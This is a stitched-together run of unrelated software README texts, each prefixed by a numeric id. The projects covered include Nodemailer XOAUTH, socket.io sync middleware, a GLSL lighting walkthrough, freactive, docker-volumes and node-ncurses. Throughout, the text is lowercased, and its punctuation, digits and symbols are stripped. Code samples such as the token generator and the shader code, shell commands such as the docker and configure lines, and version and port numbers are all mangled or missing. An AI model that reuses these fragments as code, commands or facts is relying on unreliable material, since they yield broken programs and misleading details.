to use this feature you can set xoauthtoken param as an auth option var mailoptions  auth xoauthtoken rvuighdhbzoivbwfpbcnb  alternatively it is also possible to use xoauthtoken generators supported by nodemailer this needs to be an object with a mandatory method generate that takes a callback function for generating a xoauth token string this is better for generating tokens only when needed there is no need to calculate unique token for every e mail request since a lot of these might share the same connection and thus the cleint needs not to re authenticate itself with another token var xogen token abc  generate function callback if   return callback new error tokens can t be generated in strange environments  callback null new buffer this token utf  tostring base  var mailoptions

rcptfailed event is raised instead there s also an additional property in the error object called data that includes the last response received from the server if available for the current error type you can reuse the same connection several times but you can t send a mail through the same connection concurrently so if you catch and idle event lock the connection to a message process and unlock after ready on error events you should reschedule the message and on end events you should recreate the connection by default the client tries to keep the connection up if you want to close it run client quit this sends a quit command to the server and closes the connection client quit simplesmtp has the option for connection pooling if you want to reuse a bulk of connections create a connection pool of smtp clients with simplesmtp createclientpool port host  options port is the port to connect to host is the hostname to connect to defaults to localhost options is an optional

error for example we could add logging middleware to a resource javascript var messages data resource messages messages use function req res next console log new date  req action req data next messages use middleware can be selectively applied to particular actions by specifying them in your calls to use if a request s action does not match a particular layer then that layer will be skipped in the stack for example we might want to authorize requests on create update and delete actions javascript messages use create  update  delete  function req res next and and req action is one of create  update or delete req client get access token  function err token if err return next err if isauthorized token next else next new error unauthorized messages use function req res next and and req action could be anything and and create  update or delete is authorized when clients initiate a sync with the server a request object is created and passed through the middleware stack a request object will contain the following properties action the type of sync action being performed i e create read update etc data any data provided by the client options additional options set by the client resource the resource handling the sync client the socket io client that initiated the request middleware functions can use the request object for storing arbitrary data via the get key and set key value functions javascript messages use create  function req res next req set date  new date next messages use function req res next console log req get date next the response object provides mechanisms for responding to client requests it exposes two function send and error that can be used for returning results or errors back to the client when a client connects to a particular resource a connection event is emitted on the resource this can be used to perform any initialization etc javascript messages on connection  function client console log new date  connected  client client join some room if your connection event handler needs to perform an async operation call this async from within your callback the connection will not handle any requests until all async operations have completed without error javascript messages on connection  function client var done this async client set access token  client handshake query accesstoken function done when a response is sucessfully sent back to the client a sync event is emitted on the resource and a sync object is provided javascript messages on sync  function sync and and messages resource handled a sync the sync object contains the following properties client the client that initiated the sync resource the resource that handled the sync action the sync action performed result the result returned to the client and provides these methods notify emitter emit a sync event on the given emitters stop stop the default notification syncs are broadcast to all clients by default for example javascript messages on sync  function sync and and prevent sync event from being broadcast to connected clients sync stop and and notify clients in rooms foo and bar if sync action read sync notify sync client broadcast to foo  sync client broadcast to bar the client side component provides a thin wrapper around socket io for syncing data to the server and listening for sync events triggered by the server javascript var conn data io connect var messages conn resource messages make requests to the server with a resource s sync function sync action data  options  callback perform the specified action optionally sending the given data and request options callback takes an error and a result javascript messages sync create  text hello world  function err result listen to syncs from the server with a resource s subscribe function subscribe action   callback listen for syncs happening on the server optionally passing the actions to which the client should listen callback accepts a result and action javascript and and listen to all actions messages subscribe function data action console log action data and and listen to specific actions messages subscribe create  update  delete  function data action and and action

35382964, this article provides an overview of the various steps involved in lighting a mesh with a custom glsl shader some of the features of the demo per pixel lighting flat smooth normals gamma correction for working in linear space normal specular maps for detail attenuation for point light falloff oren nayar diffuse for rough surfaces phong reflectance model for specular highlights it is not intended as a full blown beginner s guide and assumes prior knowledge of webgl and stackgl rendering although it is implemented with stackgl the same concepts and shader code could be used in threejs and other frameworks to run from source cd glsl lighting walkthrough npm install npm run start to build npm run build the code is using babelify for es template strings destructuring and arrow functions it is organized like so we use a basic material for our light indicator so that it appears at a constant color regardless of depth and lighting we use a phong material for our torus which we will explore in more depth below there are many ways to skin a cat this is just one approach to phong shading our phong shader uses standard derivatives so we need to enable the extension before we create it the javascript code looks like this and and enable the extension var ext gl getextension oesstandardderivatives if ext throw new error derivatives not supported var shader createshader gl vert frag and in our fragment shader we need to enable it explicitly precision highp float void main the extension is used in two places in our final shader our vertex shader needs to pass the texture coordinates and view space position to the fragment shader a basic vertex shader looks like this attribute vec position attribute vec uv uniform mat projection uniform mat view uniform mat model varying vec vuv varying vec vviewposition void main and and determine view space position mat modelviewmatrix view model vec viewmodelposition modelviewmatrix position and and pass varyings to fragment shader vviewposition viewmodelposition xyz vuv uv and and determine final d position glposition projection viewmodelposition varying vec vviewposition void main vec normal facenormals vviewposition glfragcolor vec normal   to transform the object normals into view space we multiply them by a normal matrix the inverse transpose of the model view matrix since this doesn t change vertex to vertex you can do it cpu side and pass it as a uniform to the vertex shader or you can just simply compute the normal matrix in the vertex step glsl es does not provide built in transpose or inverse  so we need to require them from npm and and object normals attribute vec normal varying vec vnormal void main and and rotate the object normals by a x normal matrix mat normalmatrix transpose inverse mat modelviewmatrix vnormal normalize normalmatrix normal when dealing with png and jpg textures it s important to remember that they most likely have gamma correction applied to them already and so we need to account for it when doing any work in linear space vec texturelinear samplerd utex vec uv return tolinear textured utex uv void main and and sample srgb and account for gamma vec diffusecolor texturelinear texdiffuse uv and and operate on rgb in linear space and and output final color to srgb space color togamma color we can use normal maps to add detail to the shading without additional topology a normal map typically stores a unit vector xyz in an image s rgb channels respectively the   colors are expanded into the  to  range representing the unit vector and and fragment shader and and sample texture and expand to   vec normalmap texturelinear texnormal uv     and and some normal maps use an inverted green channel normalmap y   and and determine perturbed surface normal vec v normalize vviewposition vec n perturb normalmap normal v vuv for lighting we need to determine the vector from the view space surface position to the view space light position then we can account for attenuation falloff based on the distance from light  diffuse and specular the relevant bits of the fragment shader uniform mat view void main and and determine surface to light vector vec lightposition view vec light position   vec lightvector lightposition xyz vviewposition and and calculate attenuation float lightdistance length lightvector float falloff attenuation light radius light falloff lightdistance and and light direction vec l normalize lightvector our chosen attenuation function lib and shaders and madams attenuation glsl is by tom madams but there are many others that we could choose from float attenuation float r float f float d float denom d and r and   float attenuation   and denom denom float t attenuation f and   f return max t   with our light direction surface normal and view direction we can start to work on diffuse lighting the color is multiplied by falloff to create the effect of a distant light and and diffuse term vec diffuse light color computediffuse l v n roughness albedo falloff and and texture color vec diffusecolor texturelinear texdiffuse uv rgb similarly we can apply specular with one of the following brdfs which one you choose depends on the material and aesthetic you are working with in our case glsl specular phong looks pretty good the above screenshot is scaled by x for demonstration using specularscale to drive the strength the specular is also affected by the light attenuation float specularstrength texturelinear texspecular uv r float specular specularstrength computespecular l v n shininess specular specularscale specular falloff we now calculate the final color in the following manner and and compute final color vec color diffusecolor diffuse and light ambient and specular our final color is going straight to the screen so we should re apply the gamma correction we removed earlier if the color was going through a post processing pipeline we could continue operating in linear space until the final step and and output color glfragcolor rgb togamma color glfragcolor a

sentiment trident ml is hosted on clojars a maven repository to include trident ml in your project  add the following to your pom xml repositories repository id clojars org and id and repository and repositories dependency groupid com github pmerienne and groupid version    and version and dependency storm allows trident ml to process batches of tuples in a distributed way batches will be computed among several nodes this means that trident ml can scale horizontally with workload however storm prevents state updates to append simultaneously and the model learning is done in a state update that s why the learning step can t be distributed thankfully this lack of parallelization isn t a real bottle neck because the incremental algorithms are very fast and simple distributed algorithms will not be implemented in trident ml the whole design prevents this so you can t achieve distributed learning however but you can still partition the streams to pre process and enrich your

tailbone init tailbone serve open localhost  ctrl c to stop local server tailbone deploy master posting an alternative created some confusion i m still supporting tailbone but honestly at this point i don t really know how and if this library is being used if you have used it and have stories of it being helpful even for something like prototyping an idea please send them to tailbone stories gmail com that would really help me understand how this project is being used in the wild thanks is sometimes hellip well hellip different there are tons of frameworks like but these days we write almost all our applications in javascript with need a simple backend to do its part the app engine server side apis are great and for more complex things we recommend you learn them and use them all this hopes to do is ease that barrier of use and get people writing their apps faster without worrying about their backend code that said writing more code on your backend is great if you are up to it anyway this was written in spare time to fill a need and hopefully others find it useful too backend setup for app engine so you can write your apps in javascript via frameworks like angularjs backbone etc and not have to touch any app engine code or just using plain javascript and your own xhr calls all your static resources are automatically served from client and app app engine is great at static serving and if you on app engine you get automatic optimization of your images and scripts as well as other goodies all for free it even supports large file uploads and serving do as little as possible server side if it can be done on the client do it there be as modular as possible so people can mix and match how they choose only need to edit the app yaml and appengineconfig py should work out of the box how most people plan to use it start with loose security but be able to harden as you approach launch be backend implementation agnostic whether it is go or python or something else have a unified javascript interface this is a side project made out of past experiences that being said there are a few rough edges also working on a go branch with the same api if you want to

this is prepopulated with the person who first creates this model only the signed in user can edit information on their users model we thought about owners vs editors to grant access rights like many other systems but thought it out of scope for this first pass this is about rapid prototyping also if you need to make something only modifable by an admin prefix the property with admin or admin

34062811, animate transition  library for transition animations between blocks pages in the application see live examples animate transition allows you to easily make transition between any two or more it all depends on you html elements it can be used in different variety of situations whatever you want to enhance appearance of your web site or navigate between pages in hybrid mobile application animate transition provides great performance due to using hardware accelerated css transitions you can choose from  preset animation types for blocks  animation types for popups or create your own css animation animate transition has no dependencies and supports all modern browsers including firefox  and  chrome  and  safari  and  opera  and  ie  and  ios safari   and  android browser   and unlike other libraries animate transition let you not just animate one element but made a transition between two in a way you like it also has declarative style and provides callbacks to make sure that your code will be executed in right animation phase in order to prevent interaction with the ui during the transition the whole viewport is covered by the overlay you can create use your own custom transition animation is it better than the pure css approach actually it is the pure css approach in itself but there is a helper for convenience which has callbacks in all browsers animation presets are optimized and work properly and you write your pure css animation and use it with the helper when there are more then two dozen types of browsers on android only let alone adding desktops ios and windows phone  very often it becomes a real pain without a helper and optimized css blockstransition options takes the object options as the parameter the object has the following properties container container where the animation will take place if the property is not defined by default will be used document body blockin block to which the transition is carried out if it is not defined by blockout the block with the selected animation will disappear from the screen blockout block from which the transition is carried out if it is not defined by blockin the block with the selected animation will appear at least one parameter blockin or blockout must be specified container  blockin  blockout can be both css selectors or already existing dom elements animation animation name currently the following blocks animations are supported by default slide in slide out fade in fade out cover in cover out cover double in cover double out revolution in revolution out bounce in bounce out as for showing popups you can choose from  animations popup scale in popup drop in popup revolution in popup fade in cover in cover left in cover right in bounce in to hide popup just replace in by out popup scale out popup drop out popup revolution out popup fade out cover out cover left out cover right out bounce out to create custom animation with animationname  you need to describe following css classes transition animationname for container animation animationname transition view to show for blockin and animationname transition view to hide for blockout animation beforetransition blockin blockout container function that will be performed before the transition if it is set to false  the animation will not be performed ontransitionstart blockin blockout container e function that will be performed at the start of the transition where  is the event object ontransitionend blockin blockout container e function that will be performed at the end of the

21708146, pronounced f reactive for functional reactive name subject to change this library should be considered experimental it has not been widely tested fyi this documentation is now significantly out dated and will hopefully get updated soon goals provide a simple intuitive api hello world that should be almost obvious to those familiar with clojure inspiration from reagent reagent allow for high performance performance rendering good enough for animated graphics dom perf based on a purely declarative syntax allow for reactive binding of any attribute style property or child node allow for coordinated management of state via cursors cursors inspiration from om om provide deeply integrated animation animations support allow for cursors based on paths as well as lenses provide a generic items view component items view for efficient viewing of large data sets minimize unnecessary triggering of update events allow for binding of any dom tag including polymer elements coordinate all updates via requestanimationframe wherever possible use generic algorithms wherever possible for pluggable extension points including custom polyfills event delegation etc be easy to debug debugging reactive expressions be written in pure clojurescript provide support for older browsers via polyfills not yet implemented clojure ns example refer clojure exclude atom require freactive core refer atom cursor freactive dom as dom require macros freactive macros refer rx defonce mouse pos atom nil defn view width  height  style border px solid black on mousemove fn e reset mouse pos clientx e clienty e h hello world p your mouse is at rx str mouse pos defonce root dom and append child body js and document div root dom and mount root view explanation reactive atoms in freactive instead of clojure s atom you use freactive s reactive atom which allows deref s to be captured by an enclosing reactive expression an rx in this case this is exactly the same idea as in reagent reagent and i believe it originally came from reflex reflex the rx macro the rx macro returns an ideref instance can be deref ed with whose value is the body of the expression this value gets updated when and only when one of the dependencies captured in its body reactive atom s other rx s and also things like cursor cursors s gets invalidated pains were taken to make this invalidation process as efficient and configurable as possible binding to attributes style properties and node positions passing an rx or reactive atom or any ideref instance as an attribute style property or child of a dom element represented via a hiccup vector binds it to that site freactive makes sure that any updates to rx s or atom s are propogated directly to that dom site only as often as necessary coordinated with requestanimationframe mounting components components are mounted by passing a target node and hiccup vector to the mount function this will replace the last child of the target node with the mounted node events all attributes prefixed with on will treated as event handlers and take a clojurescript function as an argument helper functions a few additional helper functions such as append child  remove  and listen are included but it is encouraged to use them sparingly and prefer the declarative hiccup syntax wherever possible freactive should be able to handle fairly high performance graphics rather than saying how fast freactive does x compared to framework y which isn t always productive  i created an example that would really tax its ability to render this is to give me as well as potential library users an idea of what it can and can t handle on different platforms this example tries to animate points on the screen svg circle nodes relative to the current mouse position it has a complexity factor n  which can be controlled by the and and buttons the number of points is n and  sup  and sup all of this is done declaratively with only the syntax described above two minute tutorial  easers easers and transitions transitions this example benchmarks performance of reactive atom  rx and easer updates freactive s rendering loop and applying those updates to dom attributes and style properties it also tests freactive s ability to clean up after itself and create new dom elements in the pause between transitions usually not perceptable for small n values  freactive is cleaning up old elements with attached rx s that need to be deactivated and creating new dom elements if the average frame rate for a given n doesn t drop after many transitions it means that freactive is doing a good job of cleaning up after itself if you notice a significant drop please report issues it you should be able to see fairly smooth animations with thousands of points n  on most modern computers even though the frame rate will start drop significantly the number of attrs updated calculation is only valid when either the mouse is moving or a transition is happening transition callbacks can be added to any dom element using the with transitions function clojure with transitions h hello world on show fn node callback do something when callback callback the framework understands the on show and on hide transitions these transitions will be applied upon changes at binding sites i e at the site of an rx or an initial mount a mechanism for triggering transitions based on changes to data state is also planned an api that wraps easer functionality in a convenient animate function that takes style and attribute properties is planned easer s are the basis of freactive animations an easer is a specialized type of deref value that is updated at every animation frame based on an easing function and target and duration parameters essentially it provides tween values easers are defined with the easer function which takes an initial value they can be transitioned to another value using the start easing function which takes the following parameters from optional  to  duration  easing fn and a on complete callback an easer is designed to be used as a dependency in a reactive computation like this clojure def ease factor animation and easer   defn my view dom and with transitions h style font size rx str  ease factor px hello world on show fn node callback animation and start easing ease factor     ease quad in out callback by creating an easing chain  we can do some more complex things clojure def ease animation and easer   def ease animation and easer   def complex transition animation and easing chain ease      ease quad in out ease      ease quad out ease      ease quint in defn my view dom and with transitions h style font size rx str  ease px opacity rx str ease hello world on show fn node callback complex transition callback optional from parameter the optional from parameter to start easing has a special behavior if the current value of the easer is different from from  the duration of easing will be adjusted linearly for now based on the difference bettween from and the current value this is to keep the speed of easing somewhat consistent if you don t want this behavior and always want the same duration regardless of the current value of the easer don t specify a from value interupting in progress easings if start easing is called on an easer that is already in an easing transition that hasn t completed it is equivalent to cancelling the current easing and sending the easer in a different direction starting from the current value if there was on on complete callback to the easing that was in progress it won t be called and is effectively cancelled this behavior can be observed in the performance example performance if you click and or while a transition is happening cursor s in freactive behave and look exactly like atom s you can use clojurescript s built in swap and reset functions on them and state will be propogated back to their parents by default change notifications from the parent propagate to the cursor when and only when they affect the state of the cursor clojure def my atom atom  defn print number my atom state print the number with some formmating defn parse number my atom state new cursor state parse new cursor state into a number and return it if parsing fails you can just return my atom state to cancel the update or throw a validation exception def a str cursor my atom print number parse number a str  reset a str   println my atom cursors can also be created by passing in a keyword or a key sequence that would be passed to get in or assoc in to the cursor function clojure def my atom atom a b x  def ab cursor my atom a b  ab x  def a cursor my atom a a keyword can be used as well this is somewhat similar but not exactly to cursors in om om which was the inspiration for cursors in freactive it should be noted that in freactive cursors were designed to work with lenses first and then with key or key sequences korks for convenience a cursor doesn t know anything about the structure of data it references i e the associative path from parent to child an experimental items view has been created but is still a work in progress this documentation describes the concept in a very general way in freactive the items view will take a container parameter hiccup virtual node  a template fn which will receive a single argument representing a cursor to a single item in the collection and should return a hiccup virtual node can be reactive  and a collection parameter representing the underlying collection that is being rendered the collection should be satisfy the iobservablecollection protocol which is still being fleshed out a basic implementation of iobservablecollection will be provided which wraps an atom containing a clojure map or vector and provides specific methods for adding and updating and removing individual items so that notifications can be done on an item specific basis with no need for diffing this type of idiom will allow for quite large collections iobservablecollection could eventually be extended to support a database backed collection and then we have something like meteor in clojurescript the items view should provide built in support for applying and removing sorts in a stable way for adding and removing filters and for limiting the displayed elements to a specific range to support paging and infinite scrolling it should be agnostic to the underlying iobservablecollection as well as the container and template fn and do things as generically as possible it should be noted that the items view will be orthogonal to the other functionality in freactive freactive core will just attempt to provide idioms which would support an items view and a good out of the box implementation in reality items view could be a separate library and alternate implementations could co exist reactive expressions can be hard to debug sometimes we notice that something should be getting invalidated that isn t or it seems like something is getting updated too often the debug rx macro can be placed around the initialization of any rx clojure debug rx rx str n and you should seeing verbose debug statements corresponding to start of dependency capture each dependency capture each invalidation event with a print out of watch keys note not all watches aware of this rx may be registered part of freactive s optimizations are smart attaching and removing of watches based on dirty flags in addition to their ability to register themselves as a dependency to an rx  reactive atom s have one additional difference from regular atom s reactive atom s do an equality check using before completing a change and notifying watches i e they will only report a change when the value actually has changed a lazy dependency invalidates a parent rx whenever it gets invalidated but it doesn t check to see if its value has really changed an eager dependency checks to see if it really has changed before notifying its parent by default rx s are lazy and cursor s are eager this is because an rx is something whose value almost always changes whenever a dependency changes and a cursor is usually something that will only change when its portion of a larger state changes i e the path a b in a b  c d  there is also an eager rx and a lazy cursor if you want to invert this default behavior details you probably shouldn t need to understand this to develop most apps but it may be useful to those trying to maximize performance in complex situations laziness relates to the iinvalidates protocol which freactive introduces basically iinvalidates defines three protocol methods add invalidation watch  remove invalidation watch and notify invalidations watches these take the same parameters as the corresponding add watch  remove watch  etc methods from iwatchable the only difference is that the callback function should take  args instead of  key and ref when something is invalidated we are communicating that it s state will probably change but that we don t know what the new state is yet so if we register an invalidation watch against an rx  it will perform lazily i e it will only compute its new state when we deref it if we register a watch against it it will perform eagerly and it will only notify about state changes to both watches and invalidation watches if the value has actually change so how do we make an rx or cursor lazy or eager well it may seem counter intuitive but reactives in freactive actually register their own dependencies instead of registering with the parent they look for a invalidate rx function to be bound in the current context and they they register it either as a watch or invalidation watch invalidate rx actually should be a fn with   and  arity overloads the  arity overload allows the dependency to take entire control over the invalidation process and the  and  arities correspond to invalidation watches and watches respectively whenever invalidate rx is called it immediately removes the watch on whatever dependency called it it will be added the next time the rx is deref ed if it is still in the rx scope after some benchmarking this method seemed to be the most efficient general method anyway because dependencies register themselves they can decide whether to register themselves lazily or eagerly it should be noted that a dependency is eager whenever anything registers a watch as opposed to an invalidation watch against it we can override a dependency s choice of eagerness or laziness by deref ing them within an eagerly or lazily macro if you ever should need that eagerly a propogation of changes to the dom attribute and node change listeners always try to register an invalidation watch first and when not available for atoms for instance a watch whenenver they receive a change notification they remove the watch queue an update to the render queue and add the watch again right before the update is applied when deref is called sometimes you want to reference a reactive atom or rx from within an rx without registering it as a dependency or maybe you want to make sure that in library code no surrounding rx is calling your function the non reactively macro in freactive macros will take care of this clojure a is registered as a dependency but b isn t rx and a non reactively b contributions

1077020, i no longer have much time to work on this project and for the most part it is deprecated now that both ffmpeg and libav have direct support for segmenting and creating mu files quite happy to point this elsewhere if someone else would like to take over the project mu segmenter is an apple http live segmenter it takes an mpeg ts stream from a tool like ffmpeg and breaks it up into multiple ts segments suitable for http live streaming from devices like iphones it also creates the mu stream descriptor which is required for this type of stream it was originally written by chase douglas and is now maintained by john to install from source you will need to make sure you have the libav and ffmpeg libraries installed on ubuntu and debian you would run apt get install libavformat dev you can then build and install mu segmenter by running automake ac and configure sudo make install some example command lines ffmpeg loglevel quiet i bigbuckbunny ogv f mpegts and ffmpeg er  i input mp f mpegts acodec libmplame ar  ab k vn and fork the project make your feature addition or bug fix add tests for it this is important so i don t break it in a future version unintentionally commit do not mess with rakefile version or history if you want to have your own version that is fine but bump version in a commit by itself i can ignore when i pull send me a pull request bonus points for topic branches copyright  copyright c  john ferlito see copying for details

23498950, docker   introduced some changes that broke functionality in this project docker   introcuded yet more changes that broke functionality here this has always been intended as a way to prototype this functionality for docker itself being that native docker volumes support is planned for docker   and the maintainence burden this project brings i am no longer going to maintain this i will happily accept pull requests to fix issues but will not provide any new fixes sorry for the inconveniece and thank you for helping out with this project this is a tool for managing your docker volumes basically since volumes are not yet first class citizens in docker they can be difficult to manage most people tend to have extra volumes laying around which are not in use because they didn t get removed with the container they were used you can run this tool remotely just as you do with the docker cli it reads dockerhost or you can specify a host using the same syntax as with docker with h unix and and and path and to and sock sock or host unix and and and path and to and sock sock this also works with tcp endpoints use this to see all your volumes inspect them export them or clean them up the primary goal of this project is to spec out ui and api for inclusion in docker some of the implementation is hacky since i specifically wanted the cli for this to act just like the docker cli that is that it doesn t need to be running on the host or have access to the host s filesystem for it to work the export function is horribly inefficient for a couple of reasons  the tools is inteded to be used remotely so there is no direct access to the host fs and as such the volumes or container filesystems  the docker cp command and the corresponding apis do not support volumes for instance you cannot do docker cp jollytorvalds and path and to and volume like you can for things not in volumes well you can but it won t be the data in the volume it will be the data at that location from the container s fs to work around these issues the export function actually copies data from a volume into a container s fs then uses the docker cp apis to pull it you can download a pre built binary from the releases section or you can use the docker image as such docker run v and var and run and docker sock and var and run and docker sock cpuguy and docker volumes list you can use the provided dockerfile build which will compile a binary for you or build yourself cd docker volumes docker build t docker volumes f dockerfile build docker run name docker volumes docker volumes docker cp docker volumes and docker volumes and by default when compiling from the dockerfile it will compile for linux and amd you can customize this using environment variables as such docker run name docker volumes e goos darwin e goarch amd docker volumes this would make a binary for darwin and amd osx  available for docker cp at the same location as above alternatively if you already have golang installed on your system you can compile it yourself cd docker volumes commands list lists all volumes on the host inspect get details of a volume takes id or name from output of list rm removes a volume a volume is only removed if no containers are using it export creates an archive of the volume and outputs it to stdout you can optionally pause all running containers which are using the requested volume before exporting the volume using pause import import a tarball generated by the export command from stdin to a specified container be default it will import it into the same directory path the volume existed on eg if it came from and data  it will put it into and data you can optionally specify a different volume path but a volume must exist at that path already or you will get an error docker volumes the missing volume manager for docker docker volumes global options command command options arguments brian goff cpuguy gmail com commands list list all volumes

1579398, while certain implementations utilize straight c for their internals this framework is fairly high level and uses composition rather than inheritance in most cases the project began its existence as cocoa data structures framework  originally authored by phillip morelock in  as an exercise in writing objective c code and consisted mainly of ported java code in later revisions performance has gained greater emphasis but the primary motivation is to provide friendly intuitive objective c interfaces for data structures not to maximize speed at any cost a common outcome when using c and and and the stl the algorithms should all be sound and perform well in general  you won t get o n performance when it should be o log n or o  if your choice of data structure type and implementation are dependent on performance or memory usage it would be wise to run the benchmarks and choose based on the time and memory complexity for specific implementations if you only need a few of the classes in the framework you can cut down on code size by either excluding parts you don t need from the framework or just including the source you do need in your own code please don t forget to include relevant copyright and license information if you choose to do so chdatastructures builds for most apple os platforms the following directions assume that you have built the appropriate framework from source or are using a binary distribution when building from source compile the all target in the release configuration which produces a disk image containing the binaries  open the xcode project for your app  add a built chdatastructures framework to your project by dragging it to the groups files pane  expand the appropriate target and use a copy files build phase to copy the framework to the frameworks directory in your application bundle the executable path in the framework binary expects this location  add import chdatastructures and chdatastructures h where necessary in your code note when building or linking against this library if you get a declaration does not declare anything compiler warning set c language dialect gccclanguagestandard in your target s build settings to gnu std gnu or later documentation is automatically indexed by xcode when the project is open and can be accessed in the quick help inspector you can also generate full documentation yourself from the main xcode project by building the documentation target if doxygen is installed and its executable is in your unix path variable it would be foolish and a lie to claim that this framework is perfect or even complete there are many things that could be improved and added the source documentation comments include bug  todo  and test annotations for several known shortcomings and i m sure there are others i m not aware of yet please know that it is not my intent to leave the hard things as an exercise to the reader believe me writing a generic iterative state saving tree traversal enumerator was no walk in the park however i would love to draw on the talents of others who can provide solutions which currently evade me or which i haven t had time to implement yet if you have ideas or even better a fix for one of these items contact me and we ll talk thanks permission to use copy modify and and or distribute this software for any purpose with or

657282, description  note mac osx users may find themselves encountering bizarre output on their terminals in some situations this is a known problem and basically requires more frequent window refresh ing to get everything to display properly requirements  terminology  functions that accept window and screen coordinates use a row column format also stdscr is the name of the first window that is created and fills the terminal and screen by default it cannot be resized or moved it is always the bottom most window and it is the window you get when you first create a new window api documentation  node ncurses exposes only one class window result is simply an integer indicating success or failure of the function  for success or  for error attributes is an unsigned integer used as a bitmask for holding window attributes all available attributes are stored in the attrs property of the module acs character is a special character used when dealing with line graphics these are automatically determined at runtime by ncurses and thus cannot be defined as constants instead they are accessible statically via the window class after at least one window has been created so that ncurses has initialized this special character set see the additional notes at the bottom for a list of the available characters an acs character can currently be retrieved by using the acs property of the module example javascript var nc require ncurses  win new nc window win hline nc cols nc acs diamond module functions  colorpair integer colorpair integer fgcolor integer bgcolor integer sets the foreground and background colors for the given color pair number the color pair number is always returned colorfg integer colorpair integer returns the foreground color currently set for the given color pair number colorbg integer colorpair integer returns the background color currently set for the given color pair number setescdelay integer delay  void  sets the duration in milliseconds to wait after esc is pressed cleanup  void  restores the terminal after using ncurses this function is automatically called when the last window is closed and thus should never be used except when handling unexpected exceptions i e in node js s uncaughtexception event so that you can safely restore the terminal back to normal redraw  void  redraws all windows flash  void  flashes the screen bell  void  sounds the terminal bell leave  void  saves the current state of ncurses in memory and exits ncurses restore  void  restores the state saved by leave and updates the screen appropriately module properties  acs object read only contains a map of all of the available acs characters keyed by their character names attrs object read only contains all of the available terminal attributes normal normal display standout best highlighting mode of the terminal underline underlining reverse reverses the foreground and background colors blink blinking dim half bright bold extra bright or bold invisible invisible or blank mode protect protected mode unsure of the real behavior for this one colors object read only contains a map of names to the basic  ansi colors black red green yellow blue magenta cyan white additional colors if available can be accessed by using their numerical value instead the above list is  through  and  through  if available are generally the bright and bold versions of the above list keys object read only contains a map of keys on the keyboard this is a long list see additional notes for all mapped keys numwins integer read only returns the number of currently open windows lines integer read only the total number of rows of the terminal cols integer read only the total number of columns of the terminal tabsize integer read only the terminal s tab size hasmouse boolean read only indicates whether the terminal supports mouse clicks functionality hascolors boolean read only indicates whether the terminal supports colors numcolors integer read only indicates the maximum number of colors the terminal supports colors maxcolorpairs integer read only the maximum number of foreground background color pairs supported by the terminal echo boolean read and write enable and disable local echoing of keyboard input showcursor boolean read and write show and hide the cursor raw boolean read and write enable and disable terminal s raw mode window events  inputchar string char integer charcode boolean iskey emitted when a key has been pressed iskey is true when a non character key has been presssed e g esc arrow key page up etc window functions  clearok boolean clearonrefresh result if redraw is true the next call to refresh will clear the screen completely and redraw the entire screen from scratch scrollok boolean scroll result controls what happens when the cursor of a window is moved off the edge of the window or scrolling region either as a result of a newline action on the bottom line or typing the last character of the last row if scroll is true the window is scrolled up one line note that in order to get the physical scrolling effect on the terminal it is also necessary to call idlok  otherwise the cursor is left at the bottom line idlok boolean useinsdelline result if useinsdelterm is true ncurses considers using the hardware insert and delete line feature of the terminal if available otherwise if useinsdelterm is false hardware line insertion and deletion is disabled this option should be enabled only if the application needs insert and delete line for example for a screen editor it is disabled by default because insert and delete line tends to be visually annoying when used in applications where it isn t really needed if insert and delete line cannot be used ncurses redraws the changed portions of all lines idcok boolean useinsdelchar result if useinsdelchar is true ncurses considers using the hardware insert and delete character feature of the terminal if available otherwise if useinsdelchar is false ncurses no longer considers using the hardware insert and delete character feature of the terminal use of character insert and delete is enabled by default leaveok boolean movecursor result normally the hardware cursor is left at the location of the window cursor being refreshed if movecursor is true ncurses will allow the cursor to be left wherever an update happens to leave it it is useful for applications where the cursor is not used since it reduces the need for cursor motions if possible the cursor is made invisible when this function is called immedok boolean immedupdate result if immedupdate is true any change in the virtual window such as the ones caused by addch  clrtobot  scroll  etc  automatically cause a call to refresh however it may degrade performance considerably due to repeated calls to refresh it is disabled by default standout boolean enable result if enable is true the standout attribute is enabled otherwise it is disabled syncok boolean autosyncup result if autosyncup is true syncup is automatically called whenever there is a change in this window syncdown result touches each location in the window that has been touched in any of its ancestor windows this function is called by refresh  so it should almost never be necessary to call it manually syncup result touches all locations in ancestors of this window that are changed in this window cursyncup result updates the current cursor position of all the ancestors of the window to reflect the current cursor position of the window hide  void  hides the window show  void  un hides the window top  void  bring the window to the front bottom  void  send the window to the back stdscr is always the bottom most window so this function will actually make the window the bottom most window right above stdscr move integer row integer column  void  moves the window to the given row and column refresh result update the physical screen to match that of the virtual screen frame string header  string footer  void  draws a frame around the window and calls label with the optional arguments boldframe string header  string footer  void  same as frame  except the frame is highlighted label string header  string footer  void  displays an optional centered header at the top and an optional centered footer at the bottom of the window centertext integer row string text  void  display a centered string at the given row cursor integer row integer column result moves the cursor to the given row and column insertln result inserts an empty row above the current row insdelln integer nrows  result if nrows  then nrows rows will be inserted above the current row if nrows  then nrows rows are deleted beginning with the current row insstr string text  integer charlimit  result insert the string into the window before the current cursor position insert stops at the end of the string or when charlimit has been reached if charlimit  it is ignored insstr integer row integer column string text  integer charlimit  result moves the cursor to the given row and column then calls the above version of insstr with the rest of the arguments attron attributes attrs result switch on the specified window attributes attroff attributes attrs result switch off the specified window attributes attrset attributes attrs result sets the window s attributes to be exactly that of the attributes

 integer colorpair result same as the above except the given row and column are used as the start position box acs character vertchar   acs character horizchar  result draws a box around the window using the optional vertical and horizontal characters if a zero is given for any of the arguments ncurses will use the posix default characters instead see additional notes border acs character

ncurses will use the posix default characters instead see additional notes hline integer length  acs character linechar  result draws a horizontal line on the current row with the given length linechar specifies the character to be used when drawing the line if linechar is zero ncurses will use the posix default characters instead see additional notes vline integer length  acs character linechar  result draws a vertical line on the current column with the given length linechar specifies the character to be used when drawing the line if linechar is zero ncurses will use the posix default characters instead see additional notes erase result copies blanks to every position in the window clearing the screen clear result similar to erase  but it also calls clearok true  so that the screen is cleared completely on the next call to refresh for the window and is repainted from scratch clrtobot result clears to the end of the window clrtoeol result clears to the end of the current row delch result deletes the character under the cursor delch integer row integer column result moves the cursor to the given row and column and then deletes the character under the cursor deleteln result deletes the current row scroll integer nlines  result scrolls nlines lines positive values scroll up and negative values scroll down setscrreg integer startrow integer endrow result sets the scrolling region of a window bounded by startrow and endrow both inclusive touchlines integer startrow integer nrows  boolean markmodified true result marks nrows rows starting at startrow as having been modified if markmodified is true or unmodified otherwise is linetouched integer row boolean indicates whether row has been marked as modified redrawln integer startrow integer nrows result redraws nrows rows starting at startrow touch result marks the entire window as having been modified untouch result marks the entire window as having been unmodified resize integer rows integer

